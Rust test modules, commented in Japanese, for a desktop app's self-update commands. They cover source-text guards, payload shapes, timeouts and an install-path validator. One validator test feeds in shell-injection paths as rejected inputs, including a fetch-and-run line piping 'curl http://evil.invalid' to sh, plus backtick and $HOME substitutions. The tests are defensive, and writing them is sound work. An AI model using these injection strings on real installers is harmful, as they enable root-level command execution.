    //! （`unwrap_or` / `unwrap_or_default` / `unwrap_or_else` は needle にヒットしないので使える）。
    //!
    //! `lib.rs` の `pinned_overlay_contract` と同じ手口（`include_str!` でソースを文字列として読み、
    //! リテラルの有無を照合する）。`check_app_update` 本体は実ネットワークに出るため単体テスト不可で、
    //! updater をモックするには**テストのためだけに本番コードへ trait 抽象を足す**ことになるので採らない。
    //! 実挙動の担保は devtools 実測（404 / available:false / available:true / 応答しないネットワーク）に置き、
    //! ここでは「後から静かに壊せる」3 点だけを止める。
    //!
    //! ⚠ **自己ヒット対策を 2 段でかける**。`include_str!` は**このテストモジュール自身のソースも含む**ため、
    //! 素朴に書くと検索文字列が自分自身にヒットして判定が骨抜きになる（`pinned_overlay_contract` が
    //! 実際に踏んだ罠）。
    //! 1. **行コメントを除いてから照合する**（`code_only()`）。この検査を説明するコメントに needle を
    //!    書いても影響しない＝**コメントを書くことでガードが壊れる**という最悪の性質を消す。
    //! 2. needle は**実行時に `format!` で組む**（assert メッセージ等、コード行の文字列リテラルに
    //!    needle が現れるのを防ぐ二重の保険）。
    //!
    //! ⚠ **限界**: これは文字列検査であって型検査ではない。網羅性は無く、たとえば `AppError` を別経路で
    //! 組み立てて生エラーを載せる書き方までは止められない。再修正トリガー＝この検査をすり抜ける
    //! 事故が実際に起きたら、そのパターンをここへ足す（あるいは lint へ移す）。
    //!
    //! ⚠ **レビュー指摘で 4 点補強した**（いずれも「本体を削除する変異」では殺せていたが、
    //! **別の壊し方には無力**だったもの。補強前後で実際にミューテーションを回して確認済み）:
    //! - **行コメントを除いて照合するようにした**（上記 1.）。補強前は、この検査を説明するコメントに
    //!   needle を書いた瞬間にそのテストが**常に通るようになる**状態だった——実際、レビュー対応で
    //!   説明コメントを足したところ 3 つのガードが同時に骨抜きになり、ミューテーションで発覚した。
    //! - `keeps_the_hang_guard` の needle を `.timeout(` から**実引数まで含めた形**に変えた
    //!   （値だけ 1 時間などに書き換える変異を殺すため）。
    //! - `never_binds_the_raw_updater_error` の等値照合は `map_err` を全廃すると `0 == 0` で**空虚に通る**
    //!   （`match` で `Err(e) =>` と書く形）。下限本数の assert を足して塞いだ。
    //! - `has_no_panicking_unwrap_or_expect` はテスト名が「panic しない」を約束しているのに
    //!   unwrap / expect の 2 語しか見ていなかったので、panic 系マクロ 4 語を足した。
    //!   なお添字アクセス・整数除算までは見ていない（そこは lint の領分）。

    const SRC: &str = include_str!("commands.rs");

    /// `SRC` から**コメントを除いた**もの。全テストはこちらを照合する。
    ///
    /// `include_str!` は自ファイル＝**この検査を説明するコメントそのもの**を含むため、素の `SRC` を
    /// 使うと「コメントを丁寧に書くほどガードが緩む」という逆立ちした性質を持つ。
    ///
    /// ⚠ **055d review Q-3 で行末コメントも落とすようにした**。以前は行頭が `//` の行しか落としておらず、
    /// 「引数を足したうえで、needle と同じ文字列を**行末コメント**に書く」だけで
    /// `install_takes_only_the_app_handle` を含む全テストが通ってしまう状態だった（ミューテーションで実測）。
    /// 「このファイルでは行末コメントを使っていない」は将来にわたる保証ではないので、書式ではなく検査側を直す。
    /// ブロックコメント（`/* */`）と、文字列リテラル中の `//` は対象外（どちらもこのファイルには無い）。
    fn code_only() -> String {
        SRC.lines()
            .map(|line| line.split("//").next().unwrap_or_default())
            .collect::<Vec<_>>()
            .join("\n")
    }

    /// `code_only()` から**空白を全部落とし**、rustfmt の「末尾カンマ付き複数行」を 1 行形と同一視したもの。
    ///
    /// ⚠ **シグネチャと出現順を照合するテストだけがこちらを使う**（055d review Q-4）。
    /// 素の `code_only()` だと `pub async fn install_app_update(app: AppHandle) -> …` が
    /// **1 行に収まっている書式に依存**し、引数名が伸びて rustfmt が
    /// `(\n    app: AppHandle,\n)` へ改行した瞬間に、**引数は 1 つのままなのに**
    /// 「フロントから宛先を指定できてしまう」という誤ったメッセージで赤くなる。
    /// 空白と末尾カンマを潰せば、書式に関係なく中身だけを見られる。
    fn code_compact() -> String {
        let stripped: String = code_only().chars().filter(|c| !c.is_whitespace()).collect();
        stripped.replace(",)", ")")
    }

    /// 可読な needle を `code_compact()` と同じ形に揃える。
    ///
    /// ⚠ needle 自体は引き続き `format!` で組むこと（この関数は書式差を吸収するだけで、
    /// **自己ヒット対策にはならない**）。
    fn compact(fragment: &str) -> String {
        fragment.chars().filter(|c| !c.is_whitespace()).collect()
    }

    #[test]
    fn does_not_override_endpoints_at_runtime() {
        // 宛先は `tauri.conf.json` の `plugins.updater.endpoints`（コンパイル時定数）だけを正とする。
        // 実行時に上書きできる経路を作らない＝フロントから宛先を差し替える余地をゼロに保つ（親 055 の egress 定義）。
        let needle = format!(".{}(", "endpoints");
        assert!(
            !code_only().contains(needle.as_str()),
            "UpdaterBuilder::endpoints() を呼んでいる（宛先は tauri.conf.json だけを正とすること）"
        );
    }

    #[test]
    fn has_no_panicking_unwrap_or_expect() {
        // `#[tauri::command] async fn` 内の panic は tokio タスクに握られ、**invoke の Promise が
        // 永久未解決**になる（055c の UI が「確認中」から戻らなくなる）。全経路を AppResult に落とす。
        let src = code_only();
        let unwrap = format!("{}()", "unwrap");
        let expect = format!(".{}(", "expect");
        assert!(!src.contains(unwrap.as_str()), "unwrap が混入している");
        assert!(!src.contains(expect.as_str()), "expect が混入している");
        // panic 系マクロも同じ結果（Promise 永久未解決）を招くので、テスト名の約束どおりまとめて止める。
        for name in ["panic", "todo", "unimplemented", "unreachable"] {
            let needle = format!("{name}{}", "!");
            assert!(
                !src.contains(needle.as_str()),
                "panic 系マクロが混入している: {name}"
            );
        }
    }

    #[test]
    fn keeps_the_hang_guard() {
        // reqwest は既定で無期限。タイムアウトが消えると「繋がるが応答しない」ネットワークで
        // panic ゼロのまま UI が固まる（CHECK_TIMEOUT の注記）。
        // ⚠ needle に**実引数まで**含めるのは、`.timeout(` だけだと「定数を残したまま値を 1 時間に
        // 書き換える」変異を素通しするため（消されるだけでなく、緩められることも防ぐ）。
        let needle = format!(".{}({})", "timeout", "CHECK_TIMEOUT");
        assert!(
            code_only().contains(needle.as_str()),
            "タイムアウト設定が消えている（応答しないネットワークで無限に待つ）"
        );
    }

    #[test]
    fn never_binds_the_raw_updater_error() {
        // updater / reqwest のエラー文字列は**エンドポイント URL を含む**（§9）。エラー値を束縛しなければ
        // そもそも文字列化して `AppError.message` へ載せようがない。すべての `map_err` が `|_|` であることを
        // 数で照合する（`|e|` が 1 つでも増えると本数がズレて落ちる）。
        let src = code_only();
        let all = format!("map_{}(", "err");
        let discarding = format!("map_{}(|_|", "err");
        let discarding_count = src.matches(discarding.as_str()).count();
        assert_eq!(
            src.matches(all.as_str()).count(),
            discarding_count,
            "エラー値を束縛している変換がある（生エラーには URL が含まれる・§9）"
        );
        // ⚠ 上の等値照合だけだと **全廃すると `0 == 0` で空虚に通る**
        //（`match … { Err(e) => return Err(AppError::internal(e.to_string())) }` の形）。
        // 実呼び出しは check 側 2 本（`build()` / `check()`）＋ install 側 5 本
        //（`current_exe()` / `build()` / `check()` / `download()` / `install()`）＝ 7 本。減ることはない。
        assert!(
            discarding_count >= 7,
            "エラーを捨てる形が失われている（別経路で生エラーを文字列化していないか確認すること・§9）"
        );
    }

    #[test]
    fn install_takes_only_the_app_handle() {
        // §3/§8: frontend から URL・バージョン・ファイル名・保存先を受け取らない。
        // ⚠ needle に**引数リストの閉じ括弧まで**含めるのは、引数を 1 つ足した瞬間に落とすため
        //（`fn install_app_update(` だけだと `(app: AppHandle, url: String)` を素通しする）。
        // ⚠ 戻り値は含めない（review S-2 で `AppResult<AppUpdateInstallOutcome>` に変えたように、
        //   戻り値は仕様の都合で動く。ここが固定したいのは**入力の面**だけ）。
        let needle = compact(&format!("pub async fn install_app_{}(app: AppHandle) ->", "update"));
        assert!(
            code_compact().contains(needle.as_str()),
            "install コマンドの引数が AppHandle だけでなくなっている（フロントから宛先を指定できてしまう）"
        );
    }

    #[test]
    fn restart_takes_only_the_app_handle() {
        let needle = compact(&format!("pub async fn restart_{}(app: AppHandle) ->", "app"));
        assert!(
            code_compact().contains(needle.as_str()),
            "restart コマンドの引数が AppHandle だけでなくなっている"
        );
    }

    #[test]
    fn install_refuses_shell_unsafe_install_paths() {
        // ⚠ 055d review S-1: plugin の macOS 昇格経路は AppleScript にインストール先のパスを
        // **エスケープせずに**埋める。`'` が入れば root 権限のコマンドインジェクション、
        // `"` / `\` が入ればメインスレッド panic。§4 の例外が安全なのは、この 1 行があるからである。
        // ⚠ **DL の前に**呼ぶこと（後ろに動かすと 100MB 落としてから捨てることになる）。
        // ⚠ needle は実行時に `format!` で組む（テスト自身のソースにヒットして順序判定が骨抜きになるのを防ぐ）。
        let src = code_compact();
        let guard = compact(&format!("{}_install_path_is_shell_safe()?;", "ensure"));
        let download_call = compact(&format!("update.{}(", "download"));
        let before_download = src.find(guard.as_str());
        let download = src.find(download_call.as_str());
        assert!(
            before_download.is_some(),
            "昇格インストール経路のパス検査が消えている（root 権限のコマンドインジェクションが復活する）"
        );
        assert!(
            before_download.unwrap_or(usize::MAX) < download.unwrap_or(0),
            "パス検査が download より後ろにある（落とし切ってから捨てることになる）"
        );
    }

    #[test]
    fn emits_installing_only_after_the_download_returned() {
        // ⚠ `download_and_install` を使わず 2 段に分けた**唯一の理由**が、`installing` を
        // **minisign 検証の後**に置くこと（plugin は `on_download_finish()` の後に `verify_signature()` を呼ぶ）。
        // 順序を戻す変異は「本体を消す」検査では殺せないので、出現位置で固定する（review Q-15）。
        // ⚠ needle は実行時に `format!` で組む（自己ヒット対策。モジュール doc の 2. と同じ理由）。
        let src = code_compact();
        let download_call = compact(&format!("update.{}(", "download"));
        // ⚠ **最初に現れる修飾付き `Installing`** を見る（enum 定義側は修飾が付かないのでヒットしない）。
        //    「後ろにも 1 つある」では、前に足す／前へ移す変異のどちらも素通しする。
        let installing_emit = compact(&format!("AppUpdateProgressPhase::{}", "Installing"));
        let download = src.find(download_call.as_str());
        let installing = src.find(installing_emit.as_str());
        assert!(
            download.is_some() && installing.is_some(),
            "目印（download 呼び出し / installing の emit）が見つからない"
        );
        assert!(
            installing.unwrap_or(0) > download.unwrap_or(usize::MAX),
            "installing の emit が download より前にある（署名検証を通る前に『インストール中』と表示される）"
        );
    }

    #[test]
    fn keeps_the_download_hang_guard() {
        // `keeps_the_hang_guard` の DL 版。`UpdaterBuilder::timeout()` は `download()` に伝播しない
        //（`Update { timeout: None, .. }` がハードコード）ので、DL 側は別途 `configure_client` で守る。
        // これが消えると **DL が無期限になり、応答しないネットワークで UI が永久に「ダウンロード中」**になる。
        let src = code_only();
        let configure = format!(".{}(", "configure_client");
        // ⚠ 実引数まで含める（値だけ 1 時間などに緩める変異を殺すため。値の妥当性そのものは
        //   `tests::download_timeouts_stay_within_sane_bounds` が別途担保している）。
        let connect = format!("{}_timeout({}_CONNECT_TIMEOUT)", "connect", "DOWNLOAD");
        let read = format!("{}_timeout({}_READ_TIMEOUT)", "read", "DOWNLOAD");
        assert!(
            src.contains(configure.as_str()),
            "DL 側のクライアント設定が消えている（download が無期限になる）"
        );
        assert!(src.contains(connect.as_str()), "接続タイムアウトが消えている");
        assert!(src.contains(read.as_str()), "read タイムアウトが消えている");
    }

    #[test]
    fn restart_stops_the_sidecar_before_restarting() {
        // ⚠ `AppHandle::restart()` は**メインスレッドから呼ぶと `RunEvent::Exit` を発火しない**ので、
        // `lib.rs` の Exit フック（sidecar 停止）に頼れない。ここを消すと**孤児 sidecar が残り、
        // 次回起動でポートを掴んだまま**になる（症状は「更新後にコメビュだけ開けない」）。
        let needle = format!("comment_sidecar::{}(&app)", "shutdown");
        assert!(
            code_only().contains(needle.as_str()),
            "再起動前の sidecar 停止が消えている（孤児プロセスが残る）"
        );
    }

    #[test]
    fn windows_install_stops_the_sidecar_before_the_process_exits() {
        // ⚠ Windows の `install()` は `ShellExecuteW` の直後に `std::process::exit(0)` する＝
        // `RunEvent::Exit` も `restart_app` も通らない。`on_before_exit` が**唯一の停止機会**。
        // ⚠ さらに、このフックは plugin 既定の `cleanup_before_exit()` を**上書きする**ので、
        // sidecar 停止と既定の後始末の**両方**が入っていることを固定する。
        let src = code_only();
        let hook = format!(".{}(", "on_before_exit");
        let stop = format!("comment_sidecar::{}(&app_for_exit)", "shutdown");
        let keep_default = format!("app_for_exit.{}()", "cleanup_before_exit");
        assert!(
            src.contains(hook.as_str()),
            "Windows の exit 前フックが消えている（更新のたびに sidecar が孤児になる）"
        );
        assert!(src.contains(stop.as_str()), "exit 前フックで sidecar を止めていない");
        assert!(
            src.contains(keep_default.as_str()),
            "plugin 既定の後始末を上書きしたまま呼び直していない"
        );
    }

    #[test]
    fn install_is_guarded_against_concurrent_runs() {
        // ⚠ アプリ定義コマンドは ACL の対象外＝**4 窓すべてから呼べる**（親 055 の限界）。
        // frontend の inFlightRef はメイン窓しか守らないので Rust 側にもガードを置く。
        // ⚠ `Drop` を消すと 1 度失敗しただけでフラグが立ちっぱなしになり、
        //   以後ずっと即 `Ok(())` を返す＝**サイレントな機能停止**になるので、こちらも固定する。
        // ⚠ **055d review Q-1 で needle を「定義」から「呼び出し」に変えた**。以前は
        //   `compare_exchange(` と `impl Drop for InstallGuard` だけを見ており、どちらも
        //   `InstallGuard` の**定義側**にヒットするため、**`install_app_update` 冒頭の取得 3 行を
        //   丸ごと消しても全テストが緑**だった（ミューテーションで実測）。しかも `acquire` は
        //   このテストが呼ぶので dead_code 警告も出ない＝コンパイラにも気付かれない。
        let src = code_compact();
        let acquire = compact(&format!("let Some(_guard) = InstallGuard::{}() else {{", "acquire"));
        let cas = compact(&format!("{}(", "compare_exchange"));
        let release = compact(&format!("impl Drop for {}", "InstallGuard"));
        assert!(
            src.contains(acquire.as_str()),
            "install コマンドが同時実行ガードを取得していない（4 窓から多重にインストールが走る）"
        );
        assert!(src.contains(cas.as_str()), "同時実行ガードが消えている");
        assert!(
            src.contains(release.as_str()),
            "ガードの解放（Drop）が消えている（1 度失敗すると二度と更新できなくなる）"
        );
    }
}

#[cfg(test)]
mod tests {
    //! 055b の**振る舞い**の仕様テスト（`check_command_contract` はソース文字列の契約、こちらは実挙動）。
    //!
    //! `check_app_update` 本体は実ネットワークに出るため単体テスト不可（updater をモックするには
    //! 本番コードに trait 抽象を足すことになるので採らない）。ネットワークに依存しない 2 つ——
    //! **frontend へ渡る JSON の形**と **`pub_date` の劣化**——だけをここで固定する。
    //!
    //! あるべき挙動（docs/tasks/055b / 055c 申し送り / docs/security.md §1・§9）:
    //! - JSON は camelCase。**省略可フィールドは `undefined` ではなく `null` で届く**
    //!   （`skip_serializing_if` を付けない＝リポジトリ全体の既存作法）。055c はここを truthy 判定で読む。
    //! - 「更新なし」は `available: false` で**返る**（エラーにしない）。
    //! - 応答にエンドポイント URL を一切含めない（§9。フィールド設計上そもそも入らないことの表明）。
    //! - `pub_date` はキー欠落・型違い・非オブジェクトのいずれでも **`None` に劣化**して壊れない。
    use super::*;

    fn to_json(status: &AppUpdateStatus) -> String {
        serde_json::to_string(status).unwrap_or_default()
    }

    fn no_update() -> AppUpdateStatus {
        AppUpdateStatus {
            current_version: "0.1.0".to_string(),
            available: false,
            latest_version: None,
            notes: None,
            pub_date: None,
        }
    }

    #[test]
    fn absent_fields_are_sent_as_null_not_omitted() {
        // ⚠ TS 型は `latestVersion?: string` だが、実際に届くのは `null`。
        // 055c が `!== undefined` で分岐すると「新バージョン: null」と表示される（レビュー Q-4）。
        let json = to_json(&no_update());
        assert!(json.contains("\"latestVersion\":null"), "実際の JSON: {json}");
        assert!(json.contains("\"notes\":null"), "実際の JSON: {json}");
        assert!(json.contains("\"pubDate\":null"), "実際の JSON: {json}");
    }

    #[test]
    fn no_update_is_a_normal_value_not_an_error() {
        // 「確認できて、更新が無かった」は available:false で返す（reject に潰さない）。
        let json = to_json(&no_update());
        assert!(json.contains("\"available\":false"));
        assert!(json.contains("\"currentVersion\":\"0.1.0\""));
    }

    #[test]
    fn update_available_carries_the_release_fields_in_camel_case() {
        let json = to_json(&AppUpdateStatus {
            current_version: "0.0.9".to_string(),
            available: true,
            latest_version: Some("0.1.0".to_string()),
            notes: Some("## 0.1.0".to_string()),
            pub_date: Some("2026-08-01T00:00:00Z".to_string()),
        });
        assert!(json.contains("\"available\":true"));
        assert!(json.contains("\"latestVersion\":\"0.1.0\""));
        assert!(json.contains("\"notes\":\"## 0.1.0\""));
        assert!(json.contains("\"pubDate\":\"2026-08-01T00:00:00Z\""));
        // snake_case が漏れていない（bindings と frontend が camelCase 前提）。
        assert!(!json.contains("latest_version"));
        assert!(!json.contains("pub_date"));
    }

    #[test]
    fn response_never_carries_the_endpoint() {
        // §9: 宛先は frontend に出さない。サーバ由来の文字列（notes）に URL が入っていても、
        // それは notes の中身であって、応答の構造が endpoint を運ぶことはない。
        let json = to_json(&no_update());
        for leak in ["http", "github", "latest.json", "://"] {
            assert!(!json.contains(leak), "応答に {leak:?} が含まれている: {json}");
        }
    }

    #[test]
    fn pub_date_is_taken_from_the_server_response_as_a_string() {
        let raw = serde_json::json!({ "version": "0.1.0", "pub_date": "2026-08-01T12:34:56Z" });
        assert_eq!(
            pub_date_from_raw(&raw),
            Some("2026-08-01T12:34:56Z".to_string())
        );
    }

    #[test]
    fn pub_date_degrades_to_none_when_the_server_shape_differs() {
        // キー欠落（`latest.json` の生成側がキー名を変えた等）。
        assert_eq!(pub_date_from_raw(&serde_json::json!({ "version": "0.1.0" })), None);
        // 型が文字列でない（数値 / null / オブジェクト / 配列）。
        assert_eq!(pub_date_from_raw(&serde_json::json!({ "pub_date": 20260801 })), None);
        assert_eq!(pub_date_from_raw(&serde_json::json!({ "pub_date": null })), None);
        assert_eq!(pub_date_from_raw(&serde_json::json!({ "pub_date": { "a": 1 } })), None);
        assert_eq!(pub_date_from_raw(&serde_json::json!({ "pub_date": ["x"] })), None);
        // そもそもオブジェクトでない応答。
        assert_eq!(pub_date_from_raw(&serde_json::json!("just a string")), None);
        assert_eq!(pub_date_from_raw(&serde_json::json!([1, 2, 3])), None);
        assert_eq!(pub_date_from_raw(&serde_json::Value::Null), None);
    }

    #[test]
    fn pub_date_keeps_the_server_string_verbatim() {
        // RFC3339 として妥当かの検証はしない（`time` を足さないため）。整形もしない＝原文のまま通す。
        let raw = serde_json::json!({ "pub_date": "not-a-date" });
        assert_eq!(pub_date_from_raw(&raw), Some("not-a-date".to_string()));
    }

    // ---- 055d ----------------------------------------------------------------
    // あるべき挙動（docs/tasks/055d / docs/security.md §9）:
    // - 進捗イベントに載るのは**バイト数とフェーズだけ**。URL・ローカルパス・バージョンを載せない。
    // - 総バイト数が不明でも壊れない（`null` で届く＝UI は不定形表示）。
    // - 進捗は間引かれる（1 チャンクごとに emit しない）。
    // - 同時実行ガードは 1 本目だけ通し、**解放される**。

    fn progress_sample(total: Option<u64>) -> AppUpdateProgress {
        AppUpdateProgress {
            phase: AppUpdateProgressPhase::Downloading,
            downloaded_bytes: 1024,
            total_bytes: total,
        }
    }

    #[test]
    fn progress_payload_only_carries_bytes_and_phase() {
        // §9 の中核。**キー集合の完全一致**で固定するので、URL でもパスでもバージョンでも
        // 「1 つ足した瞬間」に落ちる（leak 語彙を列挙する形だと知らない名前の漏洩を見逃す）。
        let value = serde_json::to_value(progress_sample(Some(2048))).unwrap_or_default();
        let mut keys = value
            .as_object()
            .map(|map| map.keys().cloned().collect::<Vec<_>>())
            .unwrap_or_default();
        keys.sort();
        // serde_json は既定で BTreeMap（キー順）なので、期待値も並べ替えて比較する。
        let mut want = vec![
            "downloadedBytes".to_string(),
            "phase".to_string(),
            "totalBytes".to_string(),
        ];
        want.sort();
        assert_eq!(keys, want, "進捗ペイロードのキーが増減している（§9）");
    }

    #[test]
    fn progress_payload_is_camel_case_and_survives_an_unknown_total() {
        let json = serde_json::to_string(&progress_sample(None)).unwrap_or_default();
        assert!(json.contains("\"phase\":\"downloading\""), "実際の JSON: {json}");
        assert!(json.contains("\"downloadedBytes\":1024"), "実際の JSON: {json}");
        // ⚠ 総バイト数不明は **`null`** で届く（`#[ts(optional)]` を付けていないので TS 型も
        // `number | null`＝wire と一致する）。UI はここを見て不定形表示に落とす。
        assert!(json.contains("\"totalBytes\":null"), "実際の JSON: {json}");
        // snake_case が漏れていない。
        assert!(!json.contains("downloaded_bytes"));
        assert!(!json.contains("total_bytes"));
    }

    #[test]
    fn installing_phase_serializes_to_a_camel_case_string() {
        let json = serde_json::to_string(&AppUpdateProgress {
            phase: AppUpdateProgressPhase::Installing,
            downloaded_bytes: 4096,
            total_bytes: Some(4096),
        })
        .unwrap_or_default();
        assert!(json.contains("\"phase\":\"installing\""), "実際の JSON: {json}");
    }

    #[test]
    fn progress_payload_never_carries_a_url_or_a_local_path() {
        // キー集合の完全一致（上）で構造は固定済みだが、**値**の側も念のため見る。
        for total in [None, Some(123_456_789_u64)] {
            let json = serde_json::to_string(&progress_sample(total)).unwrap_or_default();
            for leak in ["http", "://", "github", "/Users/", "/var/folders", "/Applications", ".app"]
            {
                assert!(!json.contains(leak), "進捗イベントに {leak:?} が含まれている: {json}");
            }
        }
    }

    #[test]
    fn progress_event_name_is_valid_and_carries_no_endpoint() {
        // Tauri が許すのは英数と `-` `/` `:` `_` のみ。不正だと `emit` が Err になり、
        // `emit_progress` は失敗を捨てるので**進捗が一切出ないまま気付けない**。
        //
        // ⚠ **055d review Q-2 で値そのものの固定を足した**。以前は文字種と leak 語彙しか見ておらず、
        //   **Rust 側の定数だけを書き換えると Rust 131 本も frontend 555 本も緑のまま
        //   進捗が一切表示されなくなる**（ミューテーションで実測）。`emit_progress` が失敗を握り潰す設計と
        //   組み合わさると実機でも「バーが動かない」以外の症状が出ないため、ここで同期点を作る。
        //   TS 側は `appUpdateApi.test.ts` が同じリテラルを固定している＝**片方を変えると必ずどちらかが落ちる**。
        assert_eq!(
            APP_UPDATE_PROGRESS_EVENT, "app-update:progress",
            "frontend の appUpdateApi.ts の APP_UPDATE_PROGRESS_EVENT と一致させること"
        );
        assert!(!APP_UPDATE_PROGRESS_EVENT.is_empty());
        assert!(
            APP_UPDATE_PROGRESS_EVENT
                .chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '-' | '/' | ':' | '_')),
            "イベント名に Tauri が許さない文字が含まれている: {APP_UPDATE_PROGRESS_EVENT}"
        );
        for leak in ["http", "github", "latest.json"] {
            assert!(!APP_UPDATE_PROGRESS_EVENT.contains(leak));
        }
    }

    #[test]
    fn install_outcome_distinguishes_doing_nothing_from_succeeding() {
        // 055d review S-2: 「インストールした」「更新が無かった」「走行中だった」を frontend が区別できること。
        // ⚠ **`alreadyRunning` を `installed` に畳むと、走行中の自己置換の最中に再起動を促す誤報が復活する。**
        for (outcome, wire) in [
            (AppUpdateInstallOutcome::Installed, "\"installed\""),
            (AppUpdateInstallOutcome::NoUpdate, "\"noUpdate\""),
            (AppUpdateInstallOutcome::AlreadyRunning, "\"alreadyRunning\""),
        ] {
            let json = serde_json::to_string(&outcome).unwrap_or_default();
            assert_eq!(json, wire, "install の結果が camelCase の文字列で届かない");
        }
        // 3 つが互いに別物であること（同じ値に潰す変異を殺す）。
        assert_ne!(
            AppUpdateInstallOutcome::Installed,
            AppUpdateInstallOutcome::AlreadyRunning
        );
        assert_ne!(
            AppUpdateInstallOutcome::Installed,
            AppUpdateInstallOutcome::NoUpdate
        );
    }

    #[test]
    fn the_elevated_install_path_check_rejects_shell_metacharacters() {
        // 055d review S-1: plugin はこのパスを AppleScript へ**エスケープせずに**埋める。
        // ⚠ 通常のインストール位置は通ること（正常系を殺さない）。
        assert!(path_is_safe_for_the_elevated_install(
            "/Applications/StreamDock.app/Contents/MacOS/stream-dock"
        ));
        assert!(path_is_safe_for_the_elevated_install(
            "/Users/someone/Applications/Stream Dock.app/Contents/MacOS/stream-dock"
        ));
        // 日本語・記号を含む普通のパスも通す（過剰に弾かない）。
        assert!(path_is_safe_for_the_elevated_install(
            "/Users/someone/アプリ(1)/StreamDock.app/Contents/MacOS/stream-dock"
        ));

        // `'` … シェルのクォートを脱出できる＝**root 権限のコマンドインジェクション**。
        assert!(!path_is_safe_for_the_elevated_install(
            "/Users/someone/Bob's Apps/StreamDock.app/Contents/MacOS/stream-dock"
        ));
        assert!(!path_is_safe_for_the_elevated_install(
            "/tmp/'; curl http://evil.invalid | sh; '/StreamDock.app"
        ));
        // `"` / `\` … AppleScript リテラルが壊れ、plugin の expect がメインスレッドで panic する。
        assert!(!path_is_safe_for_the_elevated_install("/tmp/a\"b/StreamDock.app"));
        assert!(!path_is_safe_for_the_elevated_install("/tmp/a\\b/StreamDock.app"));
        // 脱出後のコマンド置換・変数展開。
        assert!(!path_is_safe_for_the_elevated_install("/tmp/a`id`/StreamDock.app"));
        assert!(!path_is_safe_for_the_elevated_install("/tmp/a$HOME/StreamDock.app"));
        // 改行（1 行目だけが `do shell script` に渡り、残りが別の AppleScript 文になる）。
        assert!(!path_is_safe_for_the_elevated_install("/tmp/a\nb/StreamDock.app"));
        assert!(!path_is_safe_for_the_elevated_install("/tmp/a\rb/StreamDock.app"));
    }

    #[test]
    fn progress_is_throttled_by_a_byte_threshold() {
        // 間引きを消す（毎チャンク emit）／緩めすぎる（進捗が飛び飛びになる）の両方を殺す。
        //
        // ⚠ **1 発目（0 バイト）は間引きを通さず本体から直接 emit している**が、非対称は問題にならない
        //   （055d review Q-8）。閾値は 512 KiB で reqwest の 1 チャンクは通常 8〜64 KiB なので、
        //   「最初のチャンクで即 2 発目が出る」ことは実質起きない（起きても余分な 1 発は無害）。
        //   `on_chunk` は `download()` のストリームループから**単一タスクで**呼ばれる（plugin 実装で確認）ので
        //   `Ordering::Relaxed` で正しい。`Atomic*` を使っているのは競合対策ではなく `Send` 境界のため。
        assert!(!should_emit_progress(0, 0));
        assert!(!should_emit_progress(PROGRESS_EMIT_BYTES - 1, 0));
        assert!(should_emit_progress(PROGRESS_EMIT_BYTES, 0));
        assert!(!should_emit_progress(PROGRESS_EMIT_BYTES * 2, PROGRESS_EMIT_BYTES * 2));
        assert!(should_emit_progress(PROGRESS_EMIT_BYTES * 3, PROGRESS_EMIT_BYTES * 2));
        // 受信済みが後戻りしても（理論上起きないが）飽和減算で落ちない。
        assert!(!should_emit_progress(0, PROGRESS_EMIT_BYTES));
    }

    #[test]
    fn progress_threshold_stays_in_a_usable_range() {
        // 小さすぎると IPC と再レンダリングを叩きすぎ、大きすぎるとバーが動かなく見える。
        assert!(PROGRESS_EMIT_BYTES >= 64 * 1024, "間引きが細かすぎる");
        assert!(PROGRESS_EMIT_BYTES <= 1024 * 1024, "間引きが粗すぎる（バーが飛ぶ）");
    }

    #[test]
    fn download_timeouts_stay_within_sane_bounds() {
        // ⚠ `read_timeout` は**各 read でリセット**されるので総 DL 時間は縛らない。
        // 縛ってしまう値（総 deadline のつもりで 5 秒等）や、無効化に近い値を弾く。
        assert!(DOWNLOAD_CONNECT_TIMEOUT >= Duration::from_secs(5));
        assert!(DOWNLOAD_CONNECT_TIMEOUT <= Duration::from_secs(30));
        assert!(
            DOWNLOAD_READ_TIMEOUT >= Duration::from_secs(10),
            "read タイムアウトが短すぎる（低速回線の正常な DL を殺す）"
        );
        assert!(
            DOWNLOAD_READ_TIMEOUT <= Duration::from_secs(120),
            "read タイムアウトが長すぎる（応答しないネットワークで UI が固まって見える）"
        );
    }

    #[test]
    fn install_guard_admits_one_runner_and_is_released_on_drop() {
        // 2 本目は弾かれる（＝`install_app_update` が即 `Ok(())` を返す経路）。
        let first = InstallGuard::acquire();
        assert!(first.is_some(), "1 本目が取得できない");
        assert!(
            InstallGuard::acquire().is_none(),
            "実行中なのに 2 本目が通った（多重インストールが走る）"
        );
        drop(first);
        // ⚠ ここが落ちるなら Drop が壊れている＝1 度失敗すると二度と更新できなくなる。
        let again = InstallGuard::acquire();
        assert!(again.is_some(), "ガードが解放されていない（以後ずっと更新できない）");
        drop(again);
    }
}
